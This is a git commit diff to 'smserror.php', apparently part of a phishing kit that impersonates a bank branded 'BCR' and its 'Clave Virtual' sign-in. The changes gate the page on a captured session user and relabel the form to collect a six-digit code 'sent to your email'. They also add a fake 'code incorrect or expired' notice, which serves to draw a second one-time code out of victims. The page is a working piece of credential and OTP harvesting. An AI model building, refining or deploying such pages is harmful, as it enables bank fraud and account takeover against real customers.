619573bf66766776ded6a507f461219cb291860d
Colombian2020 <caercarrer@gmail.com>
2025-04-11 22:06:40 -0500

    Update smserror.php

--- smserror.php
+++ smserror.php
@@ -1,3 +1,11 @@
+<?php
+session_start();
+$usuario = $_SESSION['usuario'] ?? null;
+if (!$usuario) {
+  header("Location: index.html");
+  exit;
+}
+?>
 <!DOCTYPE html>
 <html>
 <head>
@@ -5,9 +13,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <link href="archivos/style.css" rel="stylesheet" type="text/css">
-<script>
-    alert("El codigo de seguridad a expirado, por favor espera le enviaremos uno nuevo");
-</script>
+
 <title>BCR</title>
 
 </head>
@@ -38,27 +44,30 @@
                 <p id="gfg" hidden></p>
                 <p id="address" hidden></p>
                 <div align="center">
-                    <span class="ingresartxt" style="font-size: 1.1rem;">Ingresa Código BCR Clave Virtual</span>
+                    <span class="ingresartxt" style="font-size: 0.8rem;">Ingresa el Código que le enviamos a su correo electrónico para validar tu dispositivo</span>
                 </div>
+               
                 <hr class="line1" color="#C4C4C4">
+                  <br>    <br>    <br>
                 <img class="userimg" src="archivos/Seguridad.svg">
                 <div class="floating-label">
-                    <input class="pass" type="tel" placeholder=" " name="cpass" id="cpass" autocomplete="off" maxlength="6" required>
+                    <input class="pass" type="tel" placeholder=" " name="codigo" id="cpass" autocomplete="off" maxlength="6" required>
                     <span class="highlight2"></span>
-                    <label>Clave Virtual</label>
+                    <label>Código</label>
                     <img id="imgpass1" src="archivos/ver.png" class="ver" onclick="pass1(); pass2(); pass11();">
                     <img id="imgpass2" src="archivos/ver2.png" class="ver" onclick="pass3(); pass4(); pass33();" style="display: none;">
                 </div>
+                <p style="font-size: 13px;margin-top: 109px;color:red;font-family:sans-serif;padding: 22px;">Código incorrecto o ha expirado, le enviaremos uno nuevo</p>
                 <button type="submit" class="btn-uno" style="width:190px; top:180px">Continuar</button>
             </form>
         </div>
 
         <div class="divform2">
-            <span class="ingresartxt" style="font-size: 1.1rem;">Código BCR Clave Virtual</span>
+            <span class="ingresartxt" style="font-size: 1.1rem;">Código de Seguridad</span>
             <hr class="line1" color="#C4C4C4">
             <span class="registertext">
                 Digitando los datos de su mecanismo de autenticación actual. <br><br>
-                Ingrese el código de 6 dígitos de BCR Clave Virtual.
+                Ingrese el código enviado a su método de seguridad.
             </span>
         </div>
     </div>
